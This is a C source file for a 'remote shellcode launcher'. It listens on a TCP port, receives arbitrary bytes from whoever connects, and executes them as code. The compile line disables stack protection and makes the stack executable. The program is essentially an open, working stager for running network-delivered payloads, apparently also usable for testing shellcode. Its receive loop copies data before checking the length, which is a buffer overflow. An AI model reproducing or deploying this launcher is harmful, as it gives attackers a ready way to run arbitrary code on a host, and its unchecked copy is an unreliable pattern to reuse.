

//Compile: gcc RemoteShellCodeLauncher.c -z execstack -fno-stack-protector -o RemoteShellCodeLauncher

#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<string.h>
#include<arpa/inet.h>
 
#define ERROR	-1
#define MAX_DATA	2048	
#define MAX_SHELLCODE_LEN	4096
 
char shellcode[MAX_SHELLCODE_LEN]; //Shellcode to inject (see http://shell-storm.org/shellcode/)
 
int main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	int data_len, shellcode_len;
	char data[MAX_DATA];
	int (*fptr)(); // ftpr is a pointer, named ptr, to a function that returns an int and takes no arguments
	
	//AF_INET is the address family (Internet Protocol Address) Others may be AF_IRDA and AF_BLUETOOTH
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}
		
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8); 
	/*bzero is  the same as 'memset' and shouldnt be used. In UNIX Network Programming by W. Richard Stevens, 
	he uses bzero frequently instead of memset, even in the most up-to-date edition. The book is so popular, 
	I think it's become an idiom in network programming which is why you still see it used.
	*/		
	if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}
	
	if((listen(sock, 1)) == ERROR)
	{
		perror("listen");
		exit(-1);
	}
	
	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == ERROR)
	{
		perror("accept");
		exit(-1);
	}
		
 
	data_len = shellcode_len = 0;
				
	do
	{
		data_len = recv(new, data, MAX_DATA, 0);
			
		if(data_len)
		{
			memcpy(&shellcode[shellcode_len], data, data_len);
			shellcode_len += data_len;
			if (shellcode_len > MAX_SHELLCODE_LEN)
			{
				printf("Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!\n");
				exit(-1);
			}
 
		}
			 
	}while(data_len);
 
		
	close(new);
	close(sock);
 
	if(shellcode_len)
	{
 
		printf("Shellcode size: %d\n", (int)strlen(shellcode));
		printf("Executing ...\n");
		fptr = (int(*)())shellcode;
		(int)(*fptr)();
				
	}
		
	return 0;		
}